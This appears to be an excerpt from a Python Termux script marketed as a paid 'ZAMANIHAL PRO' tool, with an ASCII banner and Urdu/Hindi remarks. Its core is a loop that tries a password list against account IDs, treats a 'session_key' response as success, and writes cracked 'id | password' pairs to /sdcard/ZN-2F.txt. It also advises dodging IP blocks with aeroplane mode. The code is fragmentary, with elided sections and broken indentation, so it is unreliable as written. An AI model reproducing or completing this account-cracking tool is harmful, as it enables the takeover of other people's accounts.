...
ZZZZZZZZZZZZZZZZZZZ        &&&&&&&&   &&&&&     NNNNNNNN         NNNNNNN
   ...
   \033[1;92m NIHAL BHAI DUA KRO ZAMAN KO GF MIL JE SINGLE HA THUMARA BHAI  
    ...
    JIN KE IDS NAHI NIKLTE HEIN UN KA IP BLOCK HOTA HA
     ...
     IP SAHI KASE HOGA RAT KO SONE SE PEHLE AEROPLANE MODE
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        name = input(" Hamza : ")
                        linex()
                        tks = ("Hi ZAMANNIHAL Sir, I Need To Buy Your Paid ZAMANIHAL PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python ZN.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        break
                                                ...
                                                open('/sdcard/ZN-2F.txt', 'a').write(cid+' | '+ps+'\n')
                                                twf.append(ids)
                                                break
                                else:
                                        continue
